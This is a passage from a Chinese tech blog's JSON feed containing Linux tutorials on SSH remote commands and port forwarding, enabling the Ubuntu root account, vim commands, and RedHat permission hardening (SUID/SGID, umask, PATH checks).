远程操作</h2>\n<div><pre><code><span>ssh</span> <span>[</span>userName<span>]</span>@<span>[</span>hostIP<span>]</span> <span>'mkdir .ssh &amp;&amp; cat >> .ssh/authorized_keys'</span> <span>&lt;</span> ~/.ssh/id_rsa.pub\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>单引号中间的部分, 表示在远程主机上执行的操作；后面的输入重定向, 表示数据通过 SSH 传向远程主机。</p>\n<p>这就是说, SSH 可以在用户和远程主机之间, 建立命令和数据的传输通道, 因此很多事情都可以通过 SSH 来完成。</p>\n<h3 id=\"【例-1】\" tabindex=\"-1\"> 【例 1】</h3>\n<p>将 <code>$HOME/src/</code> 目录下面的所有文件, 复制到远程主机的 <code>$HOME/src/</code> 目录。</p>\n<div><pre><code><span>cd</span> <span>&amp;&amp;</span> <span>tar</span> czv src <span>ssh</span> <span>[</span>userName<span>]</span>@<span>[</span>hostIP<span>]</span> <span>'tar xz'</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"【例-2】\" tabindex=\"-1\"> 【例 2】</h3>\n<p>将远程主机 <code>$HOME/src/</code> 目录下面的所有文件, 复制到用户的当前目录。</p>\n<div><pre><code><span>ssh</span> <span>[</span>userName<span>]</span>@<span>[</span>hostIP<span>]</span> <span>'tar cz src'</span> <span>tar</span> xzv\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"【例-3】\" tabindex=\"-1\"> 【例 3】</h3>\n<p>查看远程主机是否运行进程 httpd。</p>\n<div><pre><code><span>ssh</span> <span>[</span>userName<span>]</span>@<span>[</span>hostIP<span>]</span> <span>'ps ax grep [h]ttpd'</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"绑定本地端口\" tabindex=\"-1\"> 绑定本地端口</h2>\n<p>既然 SSH 可以传送数据, 那么我们可以让那些不加密的网络连接, 全部改走 SSH 连接, 从而提高安全性。</p>\n<p>假定我们要让 8080 端口的数据, 都通过 SSH 传向远程主机, 命令就这样写:</p>\n<div><pre><code><span>ssh</span> -D <span>8080</span> <span>[</span>userName<span>]</span>@<span>[</span>hostIP<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>SSH 会建立一个 socket, 去监听本地的 8080 端口。一旦有数据传向那个端口, 就自动把它转移到 SSH 连接上面, 发往远程主机。可以想象, 如果 8080 端口原来是一个不加密端口, 现在将变成一个加密端口。</p>\n<h2 id=\"本地端口转发\" tabindex=\"-1\"> 本地端口转发</h2>\n<p>有时, 绑定本地端口还不够, 还必须指定数据传送的目标主机, 从而形成点对点的&quot;端口转发&quot;。为了区别后文的&quot;远程端口转发&quot;, 我们把这种情况称为&quot;本地端口转发&quot;（Local forwarding）。</p>\n<p>假定 host1 是本地主机, host2 是远程主机。由于种种原因, 这两台主机之间无法连通。但是, 另外还有一台 host3, 可以同时连通前面两台主机。因此, 很自然的想法就是, 通过 host3, 将 host1 连上 host2。</p>\n<p>我们在 host1 执行下面的命令:</p>\n<div><pre><code><span>ssh</span> -L <span>2121</span>:<span>[</span>host2IP<span>]</span>:21 <span>[</span>host3IP<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>命令中的 L 参数一共接受三个值, 分别是&quot;本地端口: 目标主机: 目标主机端口&quot;, 它们之间用冒号分隔。这条命令的意思, 就是指定 SSH 绑定本地端口 2121, 然后指定 host3 将所有的数据, 转发到目标主机 host2 的 21 端口（假定 host2 运行 FTP, 默认端口为 21）。</p>\n<p>这样一来, 我们只要连接 host1 的 2121 端口, 就等于连上了 host2 的 21 端口。</p>\n<div><pre><code><span>ftp</span> localhost:2121\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>&quot;本地端口转发&quot;使得 host1 和 host3 之间仿佛形成一个数据传输的秘密隧道, 因此又被称为&quot;SSH 隧道&quot;。</p>\n<h2 id=\"远程端口转发\" tabindex=\"-1\"> 远程端口转发</h2>\n<p>既然&quot;本地端口转发&quot;是指绑定本地端口的转发, 那么&quot;远程端口转发&quot;（remote forwarding）当然是指绑定远程端口的转发。</p>\n<p>还是接着看上面那个例子, host1 与 host2 之间无法连通, 必须借助 host3 转发。但是, 特殊情况出现了, host3 是一台内网机器, 它可以连接外网的 host1, 但是反过来就不行, 外网的 host1 连不上内网的 host3。这时, &quot;本地端口转发&quot;就不能用了, 怎么办?</p>\n<p>解决办法是, 既然 host3 可以连 host1, 那么就从 host3 上建立与 host1 的 SSH 连接, 然后在 host1 上使用这条连接就可以了。</p>\n<p>我们在 host3 执行下面的命令:</p>\n<div><pre><code><span>ssh</span> -R <span>2121</span>:<span>[</span>host2IP<span>]</span>:21 <span>[</span>host1IP<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>R 参数也是接受三个值, 分别是&quot;远程主机端口: 目标主机: 目标主机端口&quot;。这条命令的意思, 就是让 host1 监听它自己的 2121 端口, 然后将所有数据经由 host3, 转发到 host2 的 21 端口。由于对于 host3 来说, host1 是远程主机, 所以这种情况就被称为&quot;远程端口绑定&quot;。</p>\n<p>绑定之后, 我们在 host1 就可以连接 host2 了:</p>\n<div><pre><code><span>ftp</span> localhost:2121\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>这里必须指出, &quot;远程端口转发&quot;的前提条件是, host1 和 host3 两台主机都有 sshD 和 ssh 客户端。</p>\n<h2 id=\"shh-的其他参数\" tabindex=\"-1\"> SHH 的其他参数</h2>\n<p>SSH 还有一些别的参数, 也值得介绍。</p>\n<p>N 参数, 表示只连接远程主机, 不打开远程 shell；T 参数, 表示不为这个连接分配 TTY。这个两个参数可以放在一起用, 代表这个 SSH 连接只用来传数据, 不执行远程操作。</p>\n<div><pre><code><span>ssh</span> -NT -D <span>8080</span> <span>[</span>hostIP<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>f 参数, 表示 SSH 连接成功后, 转入后台运行。这样一来, 你就可以在不中断 SSH 连接的情况下, 在本地 shell 中执行其他操作。</p>\n<div><pre><code><span>ssh</span> -f -D <span>8080</span> <span>[</span>hostIP<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>要关闭这个后台连接, 就只有用 kill 命令去杀掉进程。</p>\n",
      "date_published": "2017-08-15T21:42:25.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "liunx"
      ]
    },
    {
      "title": "Ubuntu 开启 root 用户",
      "url": "https://vxhly.github.io/views/liunx/ubuntu-enble-root.html",
      "id": "https://vxhly.github.io/views/liunx/ubuntu-enble-root.html",
      "summary": "前言\nUbuntu 默认不开启 root 账户的, 所以有需开启 root 账户的按照以下做法即可, 切换 root 账户后 chromium 浏览器不能使用。\n\n",
      "content_html": "<div><p>前言</p>\n<p>Ubuntu 默认不开启 root 账户的, 所以有需开启 root 账户的按照以下做法即可, 切换 root 账户后 chromium 浏览器不能使用。</p>\n</div>\n\n<h2 id=\"打开终端开启-root-账户\" tabindex=\"-1\"> 打开终端开启 root 账户</h2>\n<div><pre><code><span>sudo</span> <span>passwd</span> -u root\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"为-root-账户设置密码\" tabindex=\"-1\"> 为 root 账户设置密码</h2>\n<p>输入两次</p>\n<div><pre><code><span>sudo</span> <span>passwd</span> root\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"测试-root-账户\" tabindex=\"-1\"> 测试 root 账户</h3>\n<p>输入 root 密码, 进入 root 终端</p>\n<div><pre><code><span>su</span> -\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"设置登录面板-使其实现-root-登录\" tabindex=\"-1\"> 设置登录面板, 使其实现 root 登录</h2>\n<p>使用 <code>vim</code></p>\n<div><pre><code><span>sudo</span> <span>vim</span> /usr/share/lightdm/lightdm.conf.d/50-unity-greeter.conf\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>使用 <code>gedit</code></p>\n<div><pre><code><span>sudo</span> gedit /usr/share/lightdm/lightdm.conf.d/50-unity-greeter.conf\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>添加如下代码, 保存退出</p>\n<div><pre><code>user-session<span>=</span>ubuntu\ngreeter-show-manual-login<span>=</span>true\nall-guest<span>=</span>false\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h2 id=\"重启-ubuntu-需切换-root-账户\" tabindex=\"-1\"> 重启 ubuntu, 需切换 root 账户</h2>\n<div><pre><code><span>su</span> -\n<span>reboot</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h2 id=\"删除原先账户\" tabindex=\"-1\"> 删除原先账户</h2>\n<p>如果你不喜欢原先的账户, 大可以彻底删除用户</p>\n<h3 id=\"在-root-用户下\" tabindex=\"-1\"> 在 root 用户下</h3>\n<div><pre><code><span>userdel</span> -r userName\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"在普通用户下\" tabindex=\"-1\"> 在普通用户下</h3>\n<div><pre><code><span>sudo</span> <span>userdel</span> -r userName\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><div><p>注意</p>\n<p>因为需要彻底删除用户, 所以加上 的选项, 在删除用户的同时一起把这个用户的宿主目录和邮件目录删除；userName 需替换成你的原先账户名</p>\n</div>\n",
      "date_published": "2016-08-02T15:29:46.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "liunx"
      ]
    },
    {
      "title": "Liunx 学习笔记（二）vim 的使用",
      "url": "https://vxhly.github.io/views/liunx/usage-of-vim.html",
      "id": "https://vxhly.github.io/views/liunx/usage-of-vim.html",
      "summary": "前言\n本篇是 Liunx 的学习笔记系列第二篇, 这一篇将介绍 vim 的使用技巧。vim 是一款终端编辑器, 是由 vi 演变而来的, 它与 vi 最大的区别是, vim 拥有代码高亮, 其他操作都是共用的。\n\n",
      "content_html": "<div><p>前言</p>\n<p>本篇是 Liunx 的学习笔记系列第二篇, 这一篇将介绍 vim 的使用技巧。vim 是一款终端编辑器, 是由 vi 演变而来的, 它与 vi 最大的区别是, vim 拥有代码高亮, 其他操作都是共用的。</p>\n</div>\n\n<h2 id=\"vim-常用操作\" tabindex=\"-1\"> vim 常用操作</h2>\n<h3 id=\"打开文件操作\" tabindex=\"-1\"> 打开文件操作</h3>\n<table>\n<thead>\n<tr>\n<th>命令</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>vi</strong></td>\n<td>进入 vi 而不读入任何文件</td>\n</tr>\n<tr>\n<td><strong>vi [fileName]</strong></td>\n<td>进入 vi 并读入指定名称的文件（新、旧文件均可）。</td>\n</tr>\n<tr>\n<td><strong>vi +n [fileName]</strong></td>\n<td>进入 vi 并且由文件的第几行开始。</td>\n</tr>\n<tr>\n<td><strong>vi + [fileName]</strong></td>\n<td>进入 vi 并且由文件的最后一行开始。</td>\n</tr>\n<tr>\n<td><strong>vi +/pattern [fileName]</strong></td>\n<td>打开文件, 并将光标置于第一个与 pattern 匹配的串处</td>\n</tr>\n<tr>\n<td><strong>vi [fileName]....[fileName]</strong></td>\n<td>打开多个文件, 依次进行编辑</td>\n</tr>\n<tr>\n<td><strong>vi -r [fileName]</strong></td>\n<td>在上次正用 vi 编辑时发生系统崩溃, 恢复 [fileName]</td>\n</tr>\n<tr>\n<td><strong>vimdiff fileA fileB</strong></td>\n<td>比较编辑两个不同的文件</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"vim-操作模式转换图\" tabindex=\"-1\"> vim 操作模式转换图</h3>\n<p><img src=\"/assets/liunx-vim.png\" alt=\"vim 操作模式转换图\"></p>\n<h3 id=\"插入命令\" tabindex=\"-1\"> 插入命令</h3>\n<table>\n<thead>\n<tr>\n<th>命令</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>a</strong></td>\n<td>在光标所在行行尾插入</td>\n</tr>\n<tr>\n<td><strong>i</strong></td>\n<td>在光标所在字符前插入</td>\n</tr>\n<tr>\n<td><strong>I</strong></td>\n<td>在光标所在行行首插入</td>\n</tr>\n<tr>\n<td><strong>o</strong></td>\n<td>在光标下插入新行</td>\n</tr>\n<tr>\n<td><strong>O</strong></td>\n<td>在光标上插入新行</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"定位命令\" tabindex=\"-1\"> 定位命令</h3>\n<table>\n<thead>\n<tr>\n<th>命令</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>:set nu</strong></td>\n<td>设置行号</td>\n</tr>\n<tr>\n<td><strong>:set nonu</strong></td>\n<td>取消行号</td>\n</tr>\n<tr>\n<td><strong>gg</strong></td>\n<td>到第一行</td>\n</tr>\n<tr>\n<td><strong>G</strong></td>\n<td>到最后一行</td>\n</tr>\n<tr>\n<td><strong>nG</strong></td>\n<td>到第 n 行</td>\n</tr>\n<tr>\n<td><strong>:n</strong></td>\n<td>到第 n 行</td>\n</tr>\n<tr>\n<td><strong>$</strong></td>\n<td>光标移至行尾</td>\n</tr>\n<tr>\n<td><strong>0</strong></td>\n<td>光标移至行首</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"删除命令\" tabindex=\"-1\"> 删除命令</h3>\n<table>\n<thead>\n<tr>\n<th>命令</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>x</strong></td>\n<td>删除光标所在处字符</td>\n</tr>\n<tr>\n<td><strong>nx</strong></td>\n<td>删除光标所在处后 n 个字符</td>\n</tr>\n<tr>\n<td><strong>dd</strong></td>\n<td>删除光标所在行</td>\n</tr>\n<tr>\n<td><strong>ndd</strong></td>\n<td>删除 n 行</td>\n</tr>\n<tr>\n<td><strong>dG</strong></td>\n<td>删除光标所在行到文件末尾内容</td>\n</tr>\n<tr>\n<td><strong>D</strong></td>\n<td>删除光标所在处至行尾内容</td>\n</tr>\n<tr>\n<td><strong>:n1, n2d</strong></td>\n<td>删除第 n1 行到第 n2 行</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"复制和剪切命令\" tabindex=\"-1\"> 复制和剪切命令</h3>\n<table>\n<thead>\n<tr>\n<th>命令</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>yy</strong></td>\n<td>复制当前行</td>\n</tr>\n<tr>\n<td><strong>nyy</strong></td>\n<td>复制当前行（包含当前行）以下 n 行</td>\n</tr>\n<tr>\n<td><strong>dd</strong></td>\n<td>剪切当前行</td>\n</tr>\n<tr>\n<td><strong>ndd</strong></td>\n<td>剪切当前行（包含当前行）以下 n 行</td>\n</tr>\n<tr>\n<td><strong>p</strong></td>\n<td>粘贴在当前光标所在行的下一行</td>\n</tr>\n<tr>\n<td><strong>P</strong></td>\n<td>粘贴在当前光标所在行的上一行</td>\n</tr>\n<tr>\n<td><strong>nyl</strong></td>\n<td>复制 n 个字符</td>\n</tr>\n<tr>\n<td><strong>yw</strong></td>\n<td>复制一个单词</td>\n</tr>\n<tr>\n<td><strong>y$</strong></td>\n<td>复制从当前位置到行尾</td>\n</tr>\n<tr>\n<td><strong>yG</strong></td>\n<td>复制从所在行到最后一行</td>\n</tr>\n<tr>\n<td><strong>:n1, n2 co n3</strong></td>\n<td>将 n1 行到 n2 行之间的内容拷贝到第 n3+1 行【n3 行的下一行】</td>\n</tr>\n<tr>\n<td><strong>:n1, n2 m n3</strong></td>\n<td>将 n1 行到 n2 行之间的内容移至到第 n3 行下</td>\n</tr>\n<tr>\n<td><strong>J</strong></td>\n<td>把下一行的数据连接到本行之后</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"替换和取消命令\" tabindex=\"-1\"> 替换和取消命令</h3>\n<table>\n<thead>\n<tr>\n<th>命令</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>r</strong></td>\n<td>取代光标所在处字符</td>\n</tr>\n<tr>\n<td><strong>R</strong></td>\n<td>从光标所在处开始替换字符, 按 Esc 结束</td>\n</tr>\n<tr>\n<td><strong>u</strong></td>\n<td>取消上一步操作</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"搜索和搜索替换命令\" tabindex=\"-1\"> 搜索和搜索替换命令</h3>\n<table>\n<thead>\n<tr>\n<th>命令</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>/string</strong></td>\n<td>搜索指定字符串</td>\n</tr>\n<tr>\n<td><strong>:set ic</strong></td>\n<td>搜索时忽略大小写</td>\n</tr>\n<tr>\n<td><strong>:set noic</strong></td>\n<td>取消搜索时忽略大小写</td>\n</tr>\n<tr>\n<td><strong>n</strong></td>\n<td>搜索指定字符串的下一个出现位置（即同方向）</td>\n</tr>\n<tr>\n<td><strong>N</strong></td>\n<td>在反方向上重复上一次搜索命令</td>\n</tr>\n<tr>\n<td><strong>:%s/old/new/g</strong></td>\n<td>全文替换指定字符串；需要替换询问时, g 改成 c</td>\n</tr>\n<tr>\n<td><strong>:n1, n2s/old/new/g</strong></td>\n<td>在一定方位范围内替换指定字符串；需要替换询问时, g 改成 c</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"保存和退出命令\" tabindex=\"-1\"> 保存和退出命令</h3>\n<table>\n<thead>\n<tr>\n<th>命令</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>:w</strong></td>\n<td>保存修改</td>\n</tr>\n<tr>\n<td><strong>:w /[path]/[fileName]</strong></td>\n<td>另存为指定文件</td>\n</tr>\n<tr>\n<td><strong>:wq</strong>, <strong>:x</strong></td>\n<td>保存修改并退出</td>\n</tr>\n<tr>\n<td><strong>ZZ</strong></td>\n<td>快捷键, 保存修改并退出</td>\n</tr>\n<tr>\n<td><strong>:q!</strong></td>\n<td>不保存修改并退出</td>\n</tr>\n<tr>\n<td><strong>:wq!</strong></td>\n<td>保存修改并退出（文件所有者及 root 可使用, 通常在文件无写权限下使用）</td>\n</tr>\n<tr>\n<td><strong>:n1, n2 w ! command</strong></td>\n<td>将文件中 n1 行至 n2 行的内容作为 command 的输入并执行之, 若不指定 n1, n2, 则表示将整个文件内容作为 command 的输入【注意空格】例如 <code>:1,4 w! grep tom</code></td>\n</tr>\n<tr>\n<td><strong>:!command</strong></td>\n<td>暂时退出 vi 并执行 shell 指令, 执行完毕后再回到 vi。【后期应该有用】</td>\n</tr>\n<tr>\n<td><strong>:r!command</strong></td>\n<td>将命令 command 的输出结果放到当前行【强大】</td>\n</tr>\n<tr>\n<td><strong>:sh</strong></td>\n<td>暂时退出 vi 到系统下, 结束时按 <code>Ctrl + d</code> 则回到 vi。</td>\n</tr>\n<tr>\n<td><strong>:e [fileName]</strong></td>\n<td>打开文件 [fileName] 进行编辑【相当于退出当前的并打开另一个文件】</td>\n</tr>\n<tr>\n<td><strong>:e!</strong></td>\n<td>放弃修改文件内容, 重新载入该文件编辑</td>\n</tr>\n<tr>\n<td><strong>:w !sudo tee %</strong></td>\n<td>以普通用户身份打开的 vim , 修改后以 root 身份保存</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"vim-使用技巧\" tabindex=\"-1\"> vim 使用技巧</h2>\n<h3 id=\"导入文件内容\" tabindex=\"-1\"> 导入文件内容</h3>\n<div><pre><code>:r /<span>[</span>path<span>]</span>/<span>[</span>fileName<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"导入命令执行结果\" tabindex=\"-1\"> 导入命令执行结果</h3>\n<div><pre><code>:r <span>!</span>command\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"寻找命令所在目录\" tabindex=\"-1\"> 寻找命令所在目录</h3>\n<div><pre><code>:<span>!</span>which <span>command</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"定义快捷键\" tabindex=\"-1\"> 定义快捷键</h3>\n<div><pre><code>:map ^P I<span>#&lt;ESC>      # 按 Ctrl+P 组合键用 # 注释当前行</span>\n:map ^B 0x         <span># 按 Ctrl+B 组合键删除当前行的注释</span>\n:map ^H istring<span>&lt;</span>ESC<span>></span>   <span># 按 Ctrl+H 组合键在光标所在位置插入字符串</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><div><p>提示</p>\n<p><code>:map</code> 定义快捷键时, 按 Ctrl+V+key 定义快捷键；<code>:map</code> 定义的快捷键, 重启或关机失效</p>\n</div>\n<h3 id=\"连续行注释\" tabindex=\"-1\"> 连续行注释</h3>\n<div><pre><code>:n1,n2s/^/<span>#/g     # 在 n1 行到 n2 行首添加注释 #</span>\n:n1,n2s/^<span>#//g     # 在 n1 行到 n2 行首删除注释 #</span>\n:n1,n2s/^/<span>\\</span>/<span>\\</span>//g   <span># 在 n1 行到 n2 行首添加注释 //</span>\n:n1,n2s/^<span>\\</span>/<span>\\</span>//g    <span># 在 n1 行到 n2 行首删除注释 //</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><h3 id=\"替换\" tabindex=\"-1\"> 替换</h3>\n<div><pre><code>:ab string1 string2    <span># 输入 string1 将会被替换成 string2</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"编辑模式命令-永久生效\" tabindex=\"-1\"> 编辑模式命令, 永久生效</h3>\n<p><code>普通</code> 用户</p>\n<div><pre><code><span>vim</span> /home/<span>[</span>userName<span>]</span>/.vimrc\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><code>root</code> 用户</p>\n<div><pre><code><span>vim</span> /root/.vimrc\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>添加类似于以下命令代码, 无需添加 :</p>\n<div><pre><code><span>set</span> nu\nmap ^P I<span>#&lt;ESC></span>\nab <span>test</span> this is test,this is test,this is test.\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div>",
      "image": "https://vxhly.github.io/assets/liunx-vim.png",
      "date_published": "2016-09-08T22:20:23.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "liunx"
      ]
    },
    {
      "title": "RedHat 系统安全加固（二）用户和文件权限",
      "url": "https://vxhly.github.io/views/liunx/user-and-file-permissions.html",
      "id": "https://vxhly.github.io/views/liunx/user-and-file-permissions.html",
      "summary": "前言\n本系列笔记又是 Liunx 学习系列教程的一大步, 本系列学习笔记记录 RedHat 系统的安全加固。本篇笔记是记录用户和文件的权限（主要是特殊权限）, 加强系统的防御能力。\n\n",
      "content_html": "<div><p>前言</p>\n<p>本系列笔记又是 Liunx 学习系列教程的一大步, 本系列学习笔记记录 RedHat 系统的安全加固。本篇笔记是记录用户和文件的权限（主要是特殊权限）, 加强系统的防御能力。</p>\n</div>\n\n<h2 id=\"主要的介绍\" tabindex=\"-1\"> 主要的介绍</h2>\n<p>Linux 文件系统的安全主要是通过设置文件的权限来实现的。每一个 Linux 的文件或目录, 都有 3 组属性, 分别定义文件或目录的所有者, 用户组和其他人的使用权限（ <code>只读</code> 、 <code>可写</code> 、 <code>可执行</code> 、 <code>允许 SUID</code> 、 <code>允许 SGID</code> 等）。特别注意, 权限为 <code>SUID</code> 和 <code>SGID</code> 的可执行文件, 在程序运行过程中, 会给进程赋予所有者的权限, 如果被黑客发现并利用就会给系统造成危害。</p>\n<h2 id=\"查找同时存在-suid-和-sgid-的文件\" tabindex=\"-1\"> 查找同时存在 SUID 和 SGID 的文件</h2>\n<p>使用 <code>find</code> 命令</p>\n<div><pre><code><span>find</span> / -xdev -perm  -6000\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>举例, 普通用户无法直接 vi 修改 <code>/etc/passwd</code> 文件, 但却可以通过 <code>passwd</code> 命令来修改自身的密码。这时就利用了 <code>/bin/passwd</code> 的 SUID 的权限。</p>\n<p>如果一个程序被设置成了 <code>S</code> 位标志, 那么普通用户就可以以 root 身份来运行这个程序。对系统安全性有较大不利影响, 所以应禁止所有不必要的 <code>SUID/SGID</code> 程序。</p>\n<p>修改部分系统文件的 SUID 和 SGID 的权限:</p>\n<div><pre><code><span>chmod</span> a-s /usr/bin/chage\n<span>chmod</span> a-s /usr/bin/gpasswd\n<span>chmod</span> a-s /usr/bin/wall\n<span>chmod</span> a-s /usr/bin/chfn\n<span>chmod</span> a-s /usr/bin/chsh\n<span>chmod</span> a-s /usr/bin/newgrp\n<span>chmod</span> a-s /usr/bin/write\n<span>chmod</span> a-s /usr/sbin/usernetctl\n<span>chmod</span> a-s /bin/mount\n<span>chmod</span> a-s /bin/umount\n<span>chmod</span> a-s /sbin/netreport\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"find-命令\" tabindex=\"-1\"> find 命令</h3>\n<p>选项解释</p>\n<ul>\n<li><strong><code>-perm &lt;权限数值&gt;</code></strong> =&gt; 查找符合指定的权限数值的文件或目录；</li>\n<li><strong><code>-xdev</code></strong> =&gt; 将范围局限在先行的文件系统中；</li>\n<li><code>find -perm mode</code> =&gt; 表示严格匹配, 也就是你的文件权限位转换成对应的十进制数字与 mode 一模一样, 那么匹配成功, 需要注意的是如果 mode 给的数字不足 3 位, 那么前面自动添 0 (严格的说是不足 4 位, 原因就是前面所说的 <code>SetUID</code> , <code>SetGID</code> ）</li>\n<li><code>find -perm -mode</code> =&gt; 表示模糊查询, 也就是说你的文件权限位转换成对应的十进制数字被 mode 包含, 就会被搜索出来</li>\n<li><code>find -perm +mode</code> =&gt; 与 <code>-mode</code> 的区别是 <code>+mode</code> 只需其中的任意一个 1 的部分被匹配, <code>-mode</code> 是所有 1 的部分都必须被匹配, 同样 <code>+mode</code> 也不管 0 位</li>\n</ul>\n<h2 id=\"文件的默认权限\" tabindex=\"-1\"> 文件的默认权限</h2>\n<p>使用 <code>umask</code> 指定当前用户创建文件夹和文件的默认权限属性</p>\n<ul>\n<li>若使用者建立为 <code>文件</code> , 则预设 <code>没有可执行 ( x ) 项目</code> , 亦即只有 <code>rw</code> 这两个项目, 也就是最大为 <code>666</code> , 即权限为 <code>-rw-rw-rw-</code></li>\n<li>若使用者建立为 <code>目录</code> , 则由于 <code>x</code> 与是否可以进入此目录有关, 因此预设为所有权限均开放, 亦即为 <code>777</code> , 即权限为 <code>drwxrwxrwx</code></li>\n</ul>\n<h3 id=\"修改默认权限\" tabindex=\"-1\"> 修改默认权限</h3>\n<p>主要修改配置文件 <code>/etc/profile</code> 、 <code>/etc/bashrc</code> 、 <code>/etc/csh.login</code> 、 <code>/etc/csh.cshrc</code></p>\n<ul>\n<li>生成目录的权限为 <code>777-002=775</code> , 即 <code>drwxrwxr-x</code></li>\n<li>生成文件的权限为 <code>666-002=664</code> , 即 <code>-rw-rw-r--</code> <code>For Exmaple:</code></li>\n</ul>\n<div><pre><code><span>umask</span> 002\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><ul>\n<li>生成目录的权限为 <code>777-022=755</code> , 即 <code>drwxrwxr-x</code></li>\n<li>生成文件的权限为 <code>666-022=644</code> , 即 - <code>rw-r--r--</code> <code>For Exmaple:</code></li>\n</ul>\n<div><pre><code><span>umask</span> 022\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><div><p>注意</p>\n<p>不要单纯的进行数字加减<br> 比如, <code>umask 003</code> , 如果以数字加减, 则文件权限为 <code>666-003=663</code> , 相当于 <code>-rw-rw--wx</code> , 显然不正确, 应该先转换成权限属性再相减 <code>-rw-rw-rw-</code> 减去 <code>--------wx</code> , 即应该为 <code>-rw-rw-r--</code> <br> 影响: 移动规范要求 <code>umask 027</code> , 这样生成的文件默认权限为 <code>-rw-r-----</code> , 只有本用户可读、写、执行。如果业务需要, 其他用户也需要操作该 用户的文件, 就会有问题。可以使用默认的 <code>022</code></p>\n</div>\n<h2 id=\"环境变量的安全性\" tabindex=\"-1\"> 环境变量的安全性</h2>\n<h3 id=\"root-用户环境变量的安全性\" tabindex=\"-1\"> root 用户环境变量的安全性</h3>\n<p>主要检查 <code>PATH</code> 变量, <code>For Exmaple:</code></p>\n<div><pre><code><span>echo</span> <span>$PATH</span> <span>|</span> <span>egrep</span> <span>'(^|:)(\\.|:|$)'</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><img src=\"/assets/redhat-reinforce-12.png\" alt=\"RedHat 安全加固\"></p>\n<p>检查是否包含组目录权限为 <code>o+w</code> 的目录或者 <code>g+w</code> 的目录</p>\n<div><pre><code><span>find</span> <span><span>`</span><span>echo</span> <span>$PATH</span> <span>|</span> <span>tr</span> <span>':'</span> <span>' '</span><span>`</span></span> -type d <span>\\</span><span>(</span> -perm -002 -o -perm -020 <span>\\</span><span>)</span> -ls\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><ul>\n<li><code>-002</code> 表示任何目录或文件, 只要带 <code>o+w</code> 就匹配</li>\n<li><code>+002</code> 表示目录或文件只有 <code>o+w</code> 权限, 即 <code>-------w-</code> 可能会出现报错提示 <code>/root/bin</code> 目录不存在, <code>PATH</code> 里有该路径, 而实际上没有, 可以先在 <code>/root</code> 下建立一个 <code>bin</code> 目录</li>\n</ul>\n<h3 id=\"检查-root-用户环境变量-path-规范\" tabindex=\"-1\"> 检查 root 用户环境变量 path 规范</h3>\n<p>检查系统 root 用户环境变量 path 中是否包含 <code>“.”</code> , <code>For Exmaple:</code></p>\n<div><pre><code><span>env</span> <span>|</span> <span>grep</span> <span>PATH</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>修改文件 <code>/etc/profile</code> 、 <code>/etc/bashrc</code> 或 <code>/root/.bash_profile</code> 在 